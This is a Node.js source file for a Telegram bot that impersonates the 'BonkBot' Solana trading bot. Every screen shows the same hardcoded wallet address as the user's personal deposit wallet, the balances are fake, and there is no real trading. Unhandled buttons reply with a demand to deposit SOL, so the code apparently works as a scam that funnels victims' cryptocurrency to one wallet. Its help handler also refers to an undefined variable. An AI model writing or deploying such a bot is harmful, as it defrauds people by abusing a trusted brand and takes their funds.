const TelegramBot = require("node-telegram-bot-api");

const token = process.env.TELEGRAM_TOKEN;
const bot = new TelegramBot(token, { polling: true });

const messages = {
  start:
    "*Welcome to BonkBot* \n\nSolana's fastest bot to trade any coin (SPL token), and BONK's official Telegram trading bot.\n\nYou currently have no SOL balance. To get started with trading, send some SOL to your bonkbot wallet address:\n\n`2WCaM5j9uhpWjy2BiosMBq4XYQicXZK8ys84tSrKeJGk` (tap to copy)\n\nOnce done tap refresh and your balance will appear here.\n\nTo buy a token just enter a token address, or even post the birdeye link of the coin.\n\nFor more info on your wallet and to retrieve your private key, tap the wallet button below. We guarantee the safety of user funds on BONKbot, but if you expose your private key your funds will not be safe.",
  home: "*Welcome to BonkBot* \n\nYou currently have a balance of *0.0022 SOL*, but no open positions.\n\nTo get started trading, you can open a position by buying a token.\n\nTo buy a token just enter a token address or paste a Birdeye link, and you will see a Buy dashboard pop up where you can choose how much you want to buy.\n\nAdvanced traders can enable Auto Buy in their settings. When enabled, BONKbot will instantly buy any token you enter with a fixed amount that you set. This is *disabled* by default.\n\nWallet:\n`2WCaM5j9uhpWjy2BiosMBq4XYQicXZK8ys84tSrKeJGk`",
  help: "*Help:*\n\n*Which tokens can I trade?*\nAny SPL token that is a Sol pair, on Raydium, Orca, and Jupiter. We pick up raydium pairs instantly, and Jupiter will pick up non sol pairs within around 15 minutes.\n\n*How can I see how much money I've made from referrals?*\nCheck the referrals button or type /referrals to see your payment in Bonk!\n\n*I want to create a new wallet on BONKbot.*\nClick the Wallet button or type /wallet, and you will be able to configure your new wallets\n\n*Is BONKbot free? How much do i pay for transactions?*\nBONKbot is completely free! We charge 1% on transactions, and keep the bot free so that anyone can use it.\n\n*Why is My Net Profit Lower Than Expected?*\nYour Net Profit is calculated after deducting all associated costs, including Price Impact, Transfer Tax, Dex Fees, and a 1% BONKbot fee. This ensures the figure you see is what you actually receive, accounting for all transaction-related expenses.\n\n*Is there a difference between @bonkbot_bot and the backup bots?*\nNo, they are all the same bot and you can use them interchangeably. If one is slow or down, you can use the other ones. You will have access to the same wallet and positions.\n\nFurther questions? Join our Telegram group: \nhttps://t.me/BONKbotChat  ",
  chat: "Join the disucssion, share bugs and feature requests in our telegram group: https://t.me/BONKbotChat",
};

const mainMenuKeyboard = {
  inline_keyboard: [
    [
      { text: "Buy", callback_data: "buy" },
      { text: "Sell & Manage", callback_data: "sell&manage" },
    ],
    [
      { text: "Help", callback_data: "help" },
      { text: "Refer Friends", callback_data: "refer" },
      { text: "Alerts", callback_data: "alerts" },
    ],
    [
      { text: "Wallet", callback_data: "wallet" },
      { text: "Settings", callback_data: "settings" },
    ],
    [
      { text: "Pin", callback_data: "pin" },
      { text: "Refresh", callback_data: "refresh" },
    ],
  ],
  resize_keyboard: true,
};

const walletMenuKeyboard = {
  inline_keyboard: [
    [
      {
        text: "View on Solscan",
        url: "https://solscan.io/account/2WCaM5j9uhpWjy2BiosMBq4XYQicXZK8ys84tSrKeJGk",
      },
      { text: "Close", callback_data: "close" },
    ],
    [{ text: "Deposit SOL", callback_data: "deposit" }],
    [
      { text: "Withdraw all SOL", callback_data: "withdrawall" },
      { text: "Withdraw X SOL", callback_data: "withdrawx" },
    ],
    [
      { text: "Reset Wallet", callback_data: "reset" },
      { text: "Export Private Key", callback_data: "export" },
    ],
    [{ text: "Refresh", callback_data: "refresh" }],
  ],
  resize_keyboard: true,
};

function closeCurrentMenu(chatId, messageId) {
  bot
    .editMessageReplyMarkup(undefined, {
      chat_id: chatId,
      message_id: messageId,
    })
    .catch((error) => {
      console.error("Error closing menu:", error);
    });
}

exports.startFn = bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, messages.start, {
    parse_mode: "Markdown",
    reply_markup: mainMenuKeyboard,
  });
});

exports.homeFn = bot.onText(/\/home/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, messages.home, {
    parse_mode: "Markdown",
    reply_markup: mainMenuKeyboard,
  });
});

exports.helpFn = bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const menuKeyboard = {
    inline_keyboard: [[{ text: "Close", callback_data: "option1" }]],
  };
  bot.sendMessage(chatId, messages.help, {
    parse_mode: "Markdown",
    reply_markup: menuKeyboard,
  });
});

exports.chatFn = bot.onText(/\/chat/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, messages.chat, { parse_mode: "Markdown" });
});

bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  // Perform actions based on callback data
  switch (data) {
    case "buy":
      bot.sendMessage(
        chatId,
        "Buy token\n\nTo buy a token enter a token address or birdeye link",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "Close", callback_data: "close" }]],
          },
        }
      );
      break;
    case "sell&manage":
      bot.sendMessage(chatId, "No open positions", {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Close", callback_data: "close" }]],
        },
      });
      break;
    case "help":
      bot.sendMessage(chatId, messages.help, {
        parse_mode: "Markdown",
        reply_markup: menuKeyboard,
      });
      break;
    case "refer":
      bot.sendMessage(
        chatId,
        "*Referrals:*\n\nYour reflink: https://t.me/neobonk_bot?start\n\nReferrals: *0*\n\nLifetime Bonk earned: *0.00 BONK ($0.00)\n\nRewards are updated at least every 24 hours and rewards are automatically deposited to your BONK balance.\n\nRefer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[{ text: "Close", callback_data: "close" }]],
          },
        }
      );
      break;
    case "wallet":
      bot.sendMessage(
        chatId,
        "*Your Wallet*\n\nAddress: \n`2WCaM5j9uhpWjy2BiosMBq4XYQicXZK8ys84tSrKeJGk`\nBalance: *0.00 SOL*\n\nTap to copy the address and send SOL to deposit.",
        {
          parse_mode: "Markdown",
          reply_markup: walletMenuKeyboard,
        }
      );
      break;
    case "deposit":
      bot.sendMessage(
        chatId,
        "To deposit send SOL to below address:\n`2WCaM5j9uhpWjy2BiosMBq4XYQicXZK8ys84tSrKeJGk`",
        { parse_mode: "Markdown" }
      );
      break;
    case "close":
      closeCurrentMenu(chatId, messageId);
      break;
    default:
      bot.sendMessage(chatId, "Please deposit SOL to access this option");
      break;
  }
});
